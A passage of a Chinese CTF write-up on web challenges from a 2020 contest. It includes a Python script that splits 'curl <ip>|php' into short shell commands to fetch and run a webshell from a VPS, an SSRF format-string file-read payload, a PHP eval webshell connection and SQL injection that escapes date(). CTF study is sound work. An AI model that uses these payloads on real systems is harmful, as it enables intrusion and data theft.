class="line"> </span><br><span class="line">    <span class="string">'&gt;%st-'</span> % pos1,</span><br><span class="line">    <span class="comment"># 假设pos1选择 k , 创建名为 kt- 的文件,必须加个pos1，</span></span><br><span class="line">    <span class="comment"># 因为alphabetical序中t&gt;s</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">'&gt;sl'</span>,</span><br><span class="line">    <span class="comment"># 创建名为 &gt;sl 的文件；到此处有四个文件，</span></span><br><span class="line">    <span class="comment"># ls 的结果会是：dir f&gt; kt- sl</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">'*&gt;v'</span>,</span><br><span class="line">    <span class="comment"># 前文提到， * 相当于 `ls` ，那么这条命令等价于 `dir f&gt; kt- sl`&gt;v ，</span></span><br><span class="line">    <span class="comment">#  前面提到dir是不换行的，所以这时会创建文件 v 并写入 f&gt; kt- sl</span></span><br><span class="line">    <span class="comment"># 非常奇妙，这里的文件名是 v ，只能是v ，没有可选字符</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">'&gt;rev'</span>,</span><br><span class="line">    <span class="comment"># 创建名为 rev 的文件，这时当前目录下 ls 的结果是： dir f&gt; kt- rev sl v</span></span><br><span class="line"> </span><br><span class="line">    <span class="string">'*v&gt;%s'</span> % pos2,</span><br><span class="line">    <span class="comment"># 魔法发生在这里： *v 相当于 rev v ，* 看作通配符。前文也提过了，体会一下。</span></span><br><span class="line">    <span class="comment"># 这时pos2文件，也就是 g 文件内容是文件v内容的反转： ls -tk &gt; f</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># 续行分割 curl 0x11223344|php 并逆序写入</span></span><br><span class="line">    <span class="string">'&gt;p'</span>,</span><br><span class="line">    <span class="string">'&gt;ph\\'</span>,</span><br><span class="line">    </span><br><span class="line">    <span class="string">'&gt;1.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\\&gt;\\'</span>,</span><br><span class="line">    <span class="comment">#'&gt;%s\\' % ip[8:10],</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#'&gt;%s\\' % ip[6:8],</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#'&gt;%s\\' % ip[4:6],</span></span><br><span class="line">    <span class="comment">#'&gt;%s\\' % ip[2:4],</span></span><br><span class="line">    <span class="comment">#'&gt;%s\\' % ip[0:2],</span></span><br><span class="line">    <span class="comment">#'&gt;77\\',</span></span><br><span class="line">    <span class="comment">#'&gt;88\\',</span></span><br><span class="line">    <span class="comment">#'&gt;:\\',</span></span><br><span class="line">    <span class="string">'&gt;xx\\'</span>,</span><br><span class="line">    <span class="string">'&gt;x.\\'</span>,</span><br><span class="line">    <span class="string">'&gt;x\\'</span>,</span><br><span class="line">    <span class="string">'&gt;xx\\'</span>,</span><br><span class="line">    <span class="string">'&gt;xx\\'</span>,</span><br><span class="line">    <span class="string">'&gt;xx\\'</span>,</span><br><span class="line">    <span class="string">'&gt;\ \\'</span>,</span><br><span class="line">    <span class="string">'&gt;rl\\'</span>,</span><br><span class="line">    <span class="string">'&gt;cu\\'</span>,</span><br><span class="line"> </span><br><span class="line">    <span class="string">'sh\x3c'</span> + pos2,</span><br><span class="line">    <span class="comment"># sh g ;g 的内容是 ls -tk &gt; f ，那么就会把逆序的命令反转回来，</span></span><br><span class="line">    <span class="comment"># 虽然 f 的文件头部会有杂质，但不影响有效命令的执行</span></span><br><span class="line">    <span class="string">'sh\x3c'</span> + <span class="string">'f'</span>,</span><br><span class="line">    <span class="comment"># sh f 执行curl命令，下载文件，写入木马。</span></span><br><span class="line">]</span><br><span class="line">payload1=<span class="string">"compress.zlib://data:@127.0.0.1/plain;base64,&#123;0&#125;"</span></span><br><span class="line">cookie=&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"38240b1ae7b72a9837ce059cd0640347"</span>&#125;</span><br><span class="line">s = r.get(reset)</span><br><span class="line"><span class="keyword">print</span> s.text</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    <span class="keyword">assert</span> len(i) &lt;= <span class="number">4</span></span><br><span class="line">    data=&#123;<span class="string">"url"</span>:payload1.format(base64.b64encode(i))&#125;</span><br><span class="line">    s = r.post(target+<span class="string">"core/index.php"</span>,data=data,cookies=cookie)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[%d]'</span> % s.status_code, payload1.format(i)</span><br><span class="line">    <span class="keyword">print</span> s.text</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="comment">#s = r.get(sandbox + 'fun.php?cmd=uname -a')</span></span><br><span class="line"><span class="comment">#print '[%d]' % s.status_code, s.url</span></span><br><span class="line"><span class="comment">#print s.text</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.anquanke.com/post/id/87203" target="_blank" rel="noopener">参考</a></p>
<p>这里开始尝试了半天，没有成功，1.php中写不进去东西，开始是用${IFS}绕过的空格，可能，目标服务器不支持吧，或者其他地方姿势不对吧，后来看队友的脚本直接用base64编码传就ok了，然后在vps上放好马，下载运行</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309151829834.png" alt="image-20200309151829834"></p>
<h1 id="dooog"><a href="#dooog" class="headerlink" title="dooog"></a>dooog</h1><p>题目给了源码，三个头的狗，一看源码确实是三个头，开了三个服务，可以执行whoami和ls命令，但是没有回显，然后审计源码，过滤命令执行的地方在kdc/app.py</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309162853834.png" alt="image-20200309162853834"></p>
<p>这里显示判断int(time.time())-data[‘timetamp’]&lt;60才进行对cmd的检查，如果这里可以使int(time.time())-data[‘timetamp’]&gt;60的话，那么就可以绕过检查执行其他命令了。</p>
<p>我们在本地试下int(time.time())执行情况</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309163211695.png" alt="image-20200309163211695"></p>
<p>然后回溯看data[‘timetamp’]变量，它来自post传来的authenticator，继续往前看</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309163440276.png" alt="image-20200309163440276"></p>
<p>那么如果我们可以通过修改timestamp就可以得到flag了，然后修改app.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, redirect, url_for, session, flash</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">from</span> form <span class="keyword">import</span> RegisterForm, CmdForm</span><br><span class="line"><span class="keyword">from</span> toolkit <span class="keyword">import</span> AESCipher</span><br><span class="line"><span class="keyword">import</span> os, requests, json, time, base64</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">"SECRET_KEY"</span>] = os.urandom(<span class="number">32</span>)</span><br><span class="line">bootstrap = Bootstrap(app)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/cmd', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">()</span>:</span></span><br><span class="line">    form = CmdForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">            username = form.username.data</span><br><span class="line">            master_key = form.master_key.data</span><br><span class="line">            cmd = form.cmd.data</span><br><span class="line">            cryptor = AESCipher(master_key)</span><br><span class="line">            authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">'username'</span>:username, <span class="string">'timestamp'</span>: int(time.time())&#125;))</span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/getTGT'</span>, data=&#123;<span class="string">'username'</span>: username, <span class="string">'authenticator'</span>: base64.b64encode(authenticator)&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'time error'</span>:</span><br><span class="line">                flash(<span class="string">'time error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content.startswith(<span class="string">'auth'</span>):</span><br><span class="line">                flash(<span class="string">'auth error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            session[<span class="string">'session_key'</span>], session[<span class="string">'TGT'</span>] = cryptor.decrypt(base64.b64decode(res.content.split(<span class="string">'|'</span>)[<span class="number">0</span>])), res.content.split(<span class="string">'|'</span>)[<span class="number">1</span>]</span><br><span class="line">            flash(<span class="string">'GET TGT DONE'</span>)</span><br><span class="line">            <span class="comment">#visit TGS</span></span><br><span class="line">            cryptor = AESCipher(session[<span class="string">'session_key'</span>])</span><br><span class="line">            authenticator = cryptor.encrypt(json.dumps(&#123;<span class="string">'username'</span>: username, <span class="string">'timestamp'</span>: <span class="number">666</span>&#125;))</span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/getTicket'</span>,  data=&#123;<span class="string">'username'</span>: username, <span class="string">'cmd'</span>: cmd, <span class="string">'authenticator'</span>: base64.b64encode(authenticator), <span class="string">'TGT'</span>: session[<span class="string">'TGT'</span>]&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'time error'</span>:</span><br><span class="line">                flash(<span class="string">'time error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content.startswith(<span class="string">'auth'</span>):</span><br><span class="line">                flash(<span class="string">'auth error'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'cmd error'</span>:</span><br><span class="line">                flash(<span class="string">'cmd not allow'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">            flash(<span class="string">'GET Ticket DONE'</span>)</span><br><span class="line">            client_message, server_message = res.content.split(<span class="string">'|'</span>)</span><br><span class="line">            session_key = cryptor.decrypt(base64.b64decode(client_message))</span><br><span class="line">            cryptor = AESCipher(session_key)</span><br><span class="line">            authenticator = base64.b64encode(cryptor.encrypt(username))</span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5002/cmd'</span>, data=&#123;<span class="string">'server_message'</span>: server_message, <span class="string">'authenticator'</span>: authenticator&#125;)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=<span class="string">''</span>, flag=res.content)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'error'</span> , <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/register', methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">            username = form.username.data</span><br><span class="line">            master_key = form.master_key.data</span><br><span class="line">            res = requests.post(<span class="string">'http://121.37.164.32:5001/register'</span>, data=&#123;<span class="string">'username'</span>: username, <span class="string">'master_key'</span>: master_key&#125;)</span><br><span class="line">            <span class="keyword">if</span> res.content == <span class="string">'duplicate username'</span>:</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'register'</span>))</span><br><span class="line">            <span class="keyword">elif</span> res.content != <span class="string">''</span> :</span><br><span class="line">                session[<span class="string">'id'</span>] = int(res.content)</span><br><span class="line">                flash(<span class="string">'register success'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, form=form)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'error'</span> , <span class="number">500</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=<span class="literal">False</span>, port = <span class="number">5000</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309164217294.png" alt="image-20200309164217294"></p>
<h1 id="fmkq"><a href="#fmkq" class="headerlink" title="fmkq"></a>fmkq</h1><p>直接给了源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'head'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">    $begin = <span class="string">"The number you want: "</span>;</span><br><span class="line">    extract($_GET);</span><br><span class="line">    <span class="keyword">if</span>($head == <span class="string">''</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Where is your head?'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/[A-Za-z0-9]/i'</span>,$head))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Head can\'t be like this!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/log/i'</span>,$url))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'No No No'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:/i'</span>,$url))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Don\'t use strangerotocol!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $funcname = $head.<span class="string">'curl_init'</span>;</span><br><span class="line"></span><br><span class="line">    $ch = $funcname();</span><br><span class="line">    <span class="keyword">if</span>($ch)&#123;</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $output = <span class="string">'rua'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> sprintf($begin.<span class="string">'%d'</span>,$output);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里会把$head和curl_init拼接到$filename,如果有非法字符，服务器会500，然后fuzz出\可以绕过</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309165446550.png" alt="image-20200309165446550">)然后结合extract()和sprintf()可以将我们curl到的output数据显示出来，形如</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309174422589.png" alt="image-20200309174422589"></p>
<p>然后探测内网开的端口，</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309174334659.png" alt="image-20200309174334659"></p>
<p>发现8080端口开了服务，这题复现时环境关了，考点是python的格式化字符串漏洞贴一下payload吧，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;121.37.179.47:1101&#x2F;?head&#x3D;\&amp;begin&#x3D;%1$s&amp;url&#x3D;http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;read&#x2F;file&#x3D;&#123;file.__init__.__globals__[vip].__init__.__globals__&#125;%26vipcode&#x3D;0</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;121.37.179.47:1101&#x2F;?head&#x3D;\&amp;begin&#x3D;%1$s&amp;url&#x3D;http:&#x2F;&#x2F;127.0.0.1:8080&#x2F;read&#x2F;file&#x3D;&#123;vipfile.__class__.__init__.__globals__[__name__][9]&#125;l4g_1s_h3re_u_wi11_rua&#x2F;flag%26vipcode&#x3D;kWSRgrZO9VjAJzaHsIwqXEtfF5u6GxM0ov74le18hcNnUpd3</span><br></pre></td></tr></table></figure>



<h1 id="PHP-UAF"><a href="#PHP-UAF" class="headerlink" title="PHP-UAF"></a>PHP-UAF</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$sandbox = <span class="string">'/var/www/html/sandbox/'</span> . md5(<span class="string">"wdwd"</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">@mkdir($sandbox);</span><br><span class="line">@chdir($sandbox);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_REQUEST[<span class="string">'cmd'</span>])) &#123;</span><br><span class="line">    @<span class="keyword">eval</span>($_REQUEST[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>直接cmd=1;eval($_POST[‘cmd’]);</p>
<p>蚁剑连上，直接读flag。这题很迷，有时可以有时不可以</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309183007889.png" alt="image-20200309183007889"></p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309182916595.png" alt="image-20200309182916595"></p>
<h1 id="easy-trick-gzmtu"><a href="#easy-trick-gzmtu" class="headerlink" title="easy_trick_gzmtu"></a>easy_trick_gzmtu</h1><p>这题真的是神了。。。。。。。。。。。。。。。。</p>
<p>这题提示了time=2020,然后开始测注入，</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200310081344799.png" alt="image-20200310081344799"></p>
<p>注入之后很奇怪感觉有些字母被替换成了数字，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?time&#x3D;202&#39;%20||%20t%23</span><br></pre></td></tr></table></figure>

<p>通过以上可以得到，不是替换为空，然后burp开始fuzz</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">大写  BGHILNOUWYZ</span><br><span class="line">小写  dghijmnostuwyz</span><br></pre></td></tr></table></figure>

<p>这些字符会被替换为数字，开始以为只要不用这里的字符就不会被替换，然后用了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?time&#x3D;202&#39;%20||%20lefT(&#39;22&#39;,1)&#x3D;&#39;2&#39;%23</span><br></pre></td></tr></table></figure>

<p>还是会500，那么就不光是之前的那些字符会被替换了，猜测所有的字符都被替换了，比赛时候就卡在这了，然后又试了半天协议走私，没做出来，后来看了wp后，原来如此。。。。。。。。。</p>
<p>赛后分析：应该没有waf会把每个字符都替换掉，然后这里注释里写道time=Y，那么后端可能会用处理时间日期的格式或函数来处理我们的输入，然后就应该去查查mysql和php的日期处理函数，然后看到php的date()函数,</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200310082313115.png" alt="image-20200310082313115"></p>
<p>和之前的一比对确实是把那些字符替换成了数字，然后继续看这个函数，</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200310082541235.png" alt="image-20200310082541235"></p>
<p>可以这样，那么就直接联合查询注入了，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?time&#x3D;202&#39;%20\u\n\i\o\n%20\s\e\l\e\c\t%201,\g\r\o\u\p\_\c\o\n\c\a\t(\t\a\b\l\e\_\n\a\m\e),3\%20\f\r\o\m%20\i\n\f\o\r\m\a\t\i\o\n_\s\c\h\e\m\a.\t\a\b\l\e\s%20\w\h\e\r\e\%20\t\a\b\l\e\_\s\c\h\e\m\a\&#x3D;\d\a\t\a\b\a\s\e()%23 HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309201606004.png" alt="image-20200309201606004"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?time&#x3D;202&#39;%20\u\n\i\o\n%20\s\e\l\e\c\t%201,\g\r\o\u\p\_\c\o\n\c\a\t(\c\o\l\u\m\n_\n\a\m\e),3\%20\f\r\o\m%20\i\n\f\o\r\m\a\t\i\o\n_\s\c\h\e\m\a.\c\o\l\u\m\n\s%20\w\h\e\r\e\%20\t\a\b\l\e\_\s\c\h\e\m\a\&#x3D;\d\a\t\a\b\a\s\e()%23</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309201834389.png" alt="image-20200309201834389"></p>
<p>列名：id,username,passwd,url,id,content,createtime</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309201948631.png" alt="image-20200309201948631"></p>
<p>字段值 ：username  admin passwd 20200202goodluck  url   /eGlhb2xldW5n </p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309202335757.png" alt="image-20200309202335757"></p>
<p>然后跳到 <a href="http://121.37.181.246:6333/eGlhb2xldW5n/check.php" target="_blank" rel="noopener">http://121.37.181.246:6333/eGlhb2xldW5n/check.php</a></p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309202419211.png" alt="image-20200309202419211"></p>
<p>这里可以查询内部的文件，加上localhost就可以绕过，</p>
<p><img src="/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9Bweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20200309202924096.png" alt="image-20200309202924096"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> $gf;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">content_to_file</span><span class="params">($content)</span></span>&#123;	</span><br><span class="line">		$passwd = $_GET[<span class="string">'pass'</span>];</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z]+\.passwd$/m'</span>,$passwd)) </span><br><span class="line">	&#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strpos($passwd,<span class="string">"20200202"</span>))&#123;</span><br><span class="line">			<span class="keyword">echo</span> file_get_contents(<span class="string">"/"</span>.$content);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		 &#125; </span><br><span class="line">		&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">aiisc_to_chr</span><span class="params">($number)</span></span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(strlen($number)&gt;<span class="number">2</span>)&#123;</span><br><span class="line">		$str = <span class="string">""</span>;</span><br><span class="line">		 $number = str_split($number,<span class="number">2</span>);</span><br><span class="line">		 <span class="keyword">foreach</span> ($number <span class="keyword">as</span> $num ) &#123;</span><br><span class="line">		 	$str = $str .chr($num);</span><br><span class="line">		 &#125;</span><br><span class="line">		 <span class="keyword">return</span> strtolower($str);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> chr($number);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">calc</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$gf=<span class="keyword">$this</span>-&gt;gf;</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">'/[a-zA-z0-9]|\&amp;|\^|#|\$|%/'</span>, $gf))&#123;</span><br><span class="line">		  	<span class="keyword">eval</span>(<span class="string">'$content='</span>.$gf.<span class="string">';'</span>);</span><br><span class="line">		  	$content =  <span class="keyword">$this</span>-&gt;aiisc_to_chr($content); </span><br><span class="line">		  	<span class="keyword">return</span> $content;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content_to_file(<span class="keyword">$this</span>-&gt;calc());</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span 